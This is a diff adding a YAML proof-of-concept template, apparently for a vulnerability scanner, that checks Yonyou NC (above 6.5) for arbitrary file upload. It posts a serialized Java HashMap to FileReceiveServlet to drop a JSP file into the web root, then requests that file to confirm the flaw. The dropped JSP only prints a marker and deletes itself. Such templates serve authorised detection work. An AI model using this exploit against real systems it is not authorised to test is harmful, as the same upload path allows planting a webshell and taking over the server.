@@ -1,0 +1,26 @@
+name: poc-yaml-yonyou-nc-arbitrary-file-upload
+set:
+  r1: randomInt(10000, 20000)
+  r2: randomInt(1000000000, 2000000000)
+  r3: b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t"
+  r4: b".jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx"
+rules:
+  - method: POST
+    path: /servlet/FileReceiveServlet
+    headers:
+      Content-Type: multipart/form-data;
+    body: >-
+      {{r3}}{{r1}}{{r4}}<%out.print("{{r2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    expression: |
+      response.status == 200
+  - method: GET
+    path: '/{{r1}}.jsp'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r2)))
+detail:
+  author: pa55w0rd(www.pa55w0rd.online/)
+  Affected Version: "YONYOU NC > 6.5"
+  links:
+    - https://blog.csdn.net/weixin_44578334/article/details/110917053
